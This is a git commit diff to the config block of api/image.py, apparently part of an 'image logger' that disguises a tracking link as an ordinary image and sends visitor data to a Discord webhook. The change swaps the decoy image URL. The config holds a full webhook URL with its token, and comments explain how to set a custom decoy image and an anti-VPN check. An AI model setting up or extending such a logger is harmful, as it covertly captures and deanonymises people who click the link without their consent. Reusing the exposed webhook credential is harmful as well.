562ec6d903b144b92a97b5f66036df1ec7e091cc
Pxngs <kaleb_thomas2@icloud.com>
2025-08-22 02:14:22 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1408328412258500679/zv6WQKDK1YQAyQf6QWAtlGsdxFvHPjFlwkh1m8vr-lHuDp1abFZyJfZ2XNDG5TUwBxlz",
-    "image": "https://tenor.com/view/four-gif-26151912", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAcjfIlFxBpntNfx-Mwc8675SDYPxMXMDLy23XHHC8zQ&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -34,4 +34,3 @@ config = {
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
-
